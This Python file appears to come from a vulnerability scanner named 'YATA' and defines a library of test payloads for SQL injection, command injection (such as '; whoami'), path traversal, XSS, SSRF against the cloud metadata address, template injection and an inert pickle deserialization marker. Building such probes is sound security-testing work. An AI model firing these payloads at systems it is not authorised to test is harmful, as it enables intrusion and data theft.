from __future__ import annotations

import base64
import pickle


def build_pickle_rce_marker_payload() -> str:
    """Build a base64-encoded pickle stream whose __reduce__ invokes a real
    (but completely inert) builtin -- str() on a fixed marker string -- to
    prove arbitrary-callable execution during deserialization without doing
    anything destructive. This mirrors how a real payload would instead
    reduce to something like os.system(...).
    """

    class _YataPickleMarker:
        def __reduce__(self):
            return (str, ("YATA_PICKLE_RCE",))

    return base64.b64encode(pickle.dumps(_YataPickleMarker())).decode("ascii")


class AttackLibrary:
    def __init__(self) -> None:
        self._payloads = {
            "SQL Injection": [
                "' OR '1'='2",
                "admin' --",
                "' OR '1'='1' -- ",
                "1' OR 1=1 --",
                "' OR 1=1/*"
            ],
            "Hardcoded Secret": [
                "INCORRECT_KEY",
                "GENERIC_TOKEN",
                "{winning_payload}"
            ],
            "Command Injection": [
                "; whoami",
                "&& whoami",
                "; dir",
                "&& dir",
                "| whoami",
                "| dir",
                "& whoami",
                "& dir",
                "; hostname",
                "&& hostname",
                "; echo YATA_SUCCESS",
                "&& echo YATA_SUCCESS"
            ],
            "Path Traversal": [
                "../secret_admin.txt",
                "..\\secret_admin.txt",
                "../../secret_admin.txt",
                "..\\..\\secret_admin.txt",
                "../../../secret_admin.txt",
                "..\\..\\..\\secret_admin.txt"
            ],
            "Cross-Site Scripting": [
                "<script>alert('YATA_XSS')</script>",
                "<img src=x onerror=alert('YATA_XSS')>",
                "<svg onload=alert('YATA_XSS')>",
                "\"><script>alert('YATA_XSS')</script>"
            ],
            "SSRF": [
                "http://127.0.0.1/internal/secret",
                "http://localhost/internal/secret",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]/internal/secret"
            ],
            "Server-Side Template Injection": [
                "{{7*7}}"
            ],
            "Open Redirect": [
                "http://evil-yata-test.example/phish"
            ],
            "Insecure Deserialization": [
                build_pickle_rce_marker_payload()
            ]
        }

    def get_payloads(self, vulnerability_type: str, winning_payload: str) -> list[str]:
        raw_payloads = self._payloads.get(vulnerability_type, [])
        processed = []
        for p in raw_payloads:
            if p == "{winning_payload}":
                processed.append(winning_payload)
            else:
                processed.append(p)
        if not processed and winning_payload:
            processed = [winning_payload]
        return processed
